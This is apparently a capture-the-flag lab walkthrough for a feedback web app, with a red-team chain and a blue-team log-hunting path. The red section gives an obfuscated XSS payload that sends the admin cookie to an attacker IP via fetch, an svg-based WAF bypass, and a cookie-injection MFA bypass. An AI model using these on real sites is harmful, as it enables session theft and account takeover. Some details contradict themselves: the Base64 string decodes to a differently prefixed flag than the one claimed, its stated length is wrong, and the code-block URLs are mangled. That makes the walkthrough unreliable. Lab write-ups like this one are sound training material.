## Walkthrough & Exploit Chain

### 🟥 Red Team Path (The Vulnerable Application)

**PHASE 1: Reconnaissance**
* **Headers:** Inspecting the HTTP response reveals the backend technology via the `X-Powered-By` header (Flag: `SCENARIO75{Node.js}`).
    ```bash
    curl -I [http://feedback.admin.local:3075](http://feedback.admin.local:3075)
    ```
* **Hidden Paths:** The HTML source code contains an ASCII art hint pointing to `robots.txt` (Flag: `SCENARIO75{robots.txt}`). Navigating to `/robots.txt` reveals disallowed paths, including the MFA endpoint (Flag: `SCENARIO75{/api/verify-mfa}`) and the strictly restricted admin area (Flag: `SCENARIO75{/dashboard}`).
    ```bash
    curl [http://feedback.admin.local:3075/robots.txt](http://feedback.admin.local:3075/robots.txt)
    ```
* **Session Initialization:** Accessing the main page issues an initial session cookie named `pre_mfa_session` (Flag: `SCENARIO75{pre_mfa_session}`) with the status value (Flag: `SCENARIO75{pending_mfa_verification}`).

**PHASE 2: Defense Evasion (WAF & XSS)**
* **Endpoint Method:** The feedback submission form exclusively accepts `POST` requests (Flag: `SCENARIO75{POST}`).
* **WAF Evasion:** Submitting a standard `<script>` payload returns a `403` WAF block (Flag: `SCENARIO75{403}`). The attacker bypasses this using HTML5 elements like `<svg>` (Flag: `SCENARIO75{<svg>}`).
    ```html
    <!-- Blocked by WAF -->
    <script>alert(1)</script>
    
    <!-- Successful Bypass -->
    <svg onload=alert(1)>
    ```
* **Obfuscation & Exfiltration:** To steal the cookie (which has `HttpOnly` explicitly set to `False` - Flag: `SCENARIO75{False}`), the attacker obfuscates the payload using bracket notation (Flag: `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`) and uses the `fetch` API (Flag: `SCENARIO75{fetch}`).
    ```javascript
    <svg onload="fetch('[http://10.10.14.50:8000/log?c='+window](http://10.10.14.50:8000/log?c='+window)['docu'+'ment']['coo'+'kie'])">
    ```

**PHASE 3: Initial Access (MFA Bypass & Session Replay)**
* **The Bypass:** The backend verification logic is flawed. If an attacker replays an authenticated session utilizing the prefix `adm_sess` (Flag: `SCENARIO75{adm_sess}`), the system completely skips the verification endpoint (Flag: `SCENARIO75{/api/verify-mfa}`).
    ```javascript
    // Injected via browser console or intercepting proxy
    document.cookie="pre_mfa_session=pending_mfa_verification; adm_sess=1";
    ```
* **Visual Confirmation:** Accessing `/dashboard` with the stolen cookie reflects the XSS payload inside a container with the CSS class `xss-payload` (Flag: `SCENARIO75{xss-payload}`).
* **Victory:** Deep within the administrative dashboard, the final flag is exposed: `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`.

---

### 🟦 Blue Team Path (Telemetry & Log Forensics)

**PHASE 1: Log Forensics**
* **Log Location:** The analyst SSHs into the machine (Port `2275`) and navigates to the logs directory (Flag: `SCENARIO75{/opt/admin/logs}`).
    ```bash
    ssh analyst@feedback.admin.local -p 2275
    cd /opt/admin/logs
    ```
* **Attacker Footprint:** `access.log` shows the attacker originating from IP `10.10.14.50` (Flag: `SCENARIO75{10.10.14.50}`) utilizing a `Mozilla/5.0` User-Agent (Flag: `SCENARIO75{Mozilla/5.0}`).
    ```bash
    grep "10.10.14.50" access.log
    ```
* **Dashboard Access:** A successful `200` status (Flag: `SCENARIO75{200}`) for the `/dashboard` access is recorded exactly at `18:51:55` (Flag: `SCENARIO75{18:51:55}`).
* **Exfiltration Trace:** The `X-Forwarded-For` header contains a suspicious string (Flag: `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`).
    ```bash
    cat access.log | grep "10.10.14.50" | awk -F'"' '{print $8}'
    ```

**PHASE 2: Threat Hunting**
* **Subnet Mapping:** Baseline legitimate traffic originates from `192.168.1.100` (Flag: `SCENARIO75{192.168.1.100}`). The attacker's IP belongs to the `10.10.14.0/24` subnet (Flag: `SCENARIO75{10.10.14.0/24}`).
* **WAF Alerts:** `error.log` (Flag: `SCENARIO75{/opt/admin/logs/error.log}`) records the very first WAF block for the `<script>` tag (Flag: `SCENARIO75{<script>}`) exactly at timestamp `18:50:15` (Flag: `SCENARIO75{18:50:15}`).
    ```bash
    grep "403" error.log | grep "script"
    ```
* **Endpoint Verification:** Logs confirm the attacker's IP `No` (never) reached the MFA verification endpoint (Flag: `SCENARIO75{No}`).
    ```bash
    grep "10.10.14.50" access.log | grep "/api/verify-mfa" # Returns empty
    ```

**PHASE 3: Incident Response**
* **Encoding Analysis:** The string in the header is identified as `Base64` encoding (Flag: `SCENARIO75{Base64}`), exactly `44` characters long (Flag: `SCENARIO75{44}`).
* **Severity Markers:** The bypass event is flagged with a `CRITICAL` log level (Flag: `SCENARIO75{CRITICAL}`).
* **Anomaly Timestamps:** A specific entry at `18:53:10` (Flag: `SCENARIO75{18:53:10}`) contains the exact warning string: `Authentication bypass anomaly` (Flag: `SCENARIO75{Authentication bypass anomaly}`).
    ```bash
    grep "CRITICAL" error.log | grep "Authentication bypass anomaly"
    ```
* **Victory:** Decoding the Base64 string yields the final Blue Team flag: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`.
    ```bash
    echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=" | base64 -d
    ```
